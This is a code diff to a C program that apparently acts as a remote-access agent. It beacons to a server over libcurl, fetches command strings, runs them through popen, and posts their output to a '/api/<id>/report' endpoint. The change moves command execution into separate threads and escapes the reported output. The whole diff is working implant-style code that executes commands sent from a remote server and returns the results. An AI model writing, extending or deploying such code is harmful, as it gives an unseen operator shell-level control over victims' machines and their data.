@@ -5,6 +5,7 @@
 #include <time.h>
 #include <curl/curl.h>
 #include <unistd.h>
+#include <pthread.h>
 
 #define BUFFER_SIZE 256
 
@@ -199,11 +200,12 @@ char* post_request(char *path, char *post_data, bool json)
         }
         else
         {
-            curl_easy_setopt(curl, CURLOPT_TCP_NODELAY, 1L);
-            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+            char *escaped_post_data = curl_easy_escape(curl, post_data, strlen(post_data));
+            char *final_post_data = malloc(strlen(escaped_post_data) + BUFFER_SIZE);
+            sprintf(final_post_data,"output=%s",escaped_post_data);
             curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(post_data)+1);
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_post_data);
+            curl_free(escaped_post_data);
         }
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
@@ -218,10 +220,10 @@ char* post_request(char *path, char *post_data, bool json)
 /* ----------------------------------------------------------------------- *
 *  Action Threads
 * ------------------------------------------------------------------------ */
-char* send_output(char* output, bool newlines)
+void send_output(char* output, bool newlines)
 {
     char *output_temp = malloc(strlen(output)+BUFFER_SIZE);
-    if(output!= NULL && output[0] == '\0') return "";
+    if(output!= NULL && output[0] == '\0') return;
     if(newlines)
     {
         strcpy(output_temp,output);
@@ -229,10 +231,8 @@ char* send_output(char* output, bool newlines)
     }
     else strcpy(output_temp,output);
     char *path = malloc(BUFFER_SIZE);
-    char *post_data = malloc(strlen(output_temp)+BUFFER_SIZE);
     sprintf(path, "/api/%s/report", get_unique_id());
-    sprintf(post_data,"output=%s",output_temp);
-    return post_request(path, post_data, false);
+    post_request(path, output_temp, false);
 
 }
 char* say_hello()
@@ -248,8 +248,9 @@ char* say_hello()
     return post_request(path, post_data, true);
 }
 
-void do_command(char* command)
+void* do_command(void* input)
 {
+    char* command = (char*)input;
     command = realloc(command, strlen(command)+BUFFER_SIZE);
     printf("%s",command);
     sprintf(command, "%s 2>&1", command);
@@ -259,8 +260,7 @@ void do_command(char* command)
     FILE *f = popen(command, "r");
     if(f == NULL)
     {
-        perror("popen:");
-        return;
+        pthread_exit(NULL);
     }
     while(fgets(buffer, sizeof(buffer), f) != NULL) {
         if(strlen(output) >= buffer_size-300)
@@ -276,6 +276,7 @@ void do_command(char* command)
     printf("\n");
     send_output(output, true);
     pclose(f);
+    pthread_exit(NULL);
 }
 
 /* ----------------------------------------------------------------------- *
@@ -309,7 +310,7 @@ void setup()
 
 void run()
 {
-    char *todo = malloc(BUFFER_SIZE);
+    char *todo = malloc(BUFFER_SIZE*2);
     char *output = malloc(BUFFER_SIZE);
     while(1){
         todo = say_hello();
@@ -321,6 +322,7 @@ void run()
             send_output(output, true);
             char *command = get_command(todo);
             int args_len = get_args_len(todo);
+            pthread_t tid;
             if(strcmp("cd",command) == 0)
             {
                 if(args_len == 0)
@@ -362,7 +364,7 @@ void run()
 */
             else
             {
-                do_command(todo);
+                pthread_create(&tid, NULL, do_command, todo);
             }
         }
         else
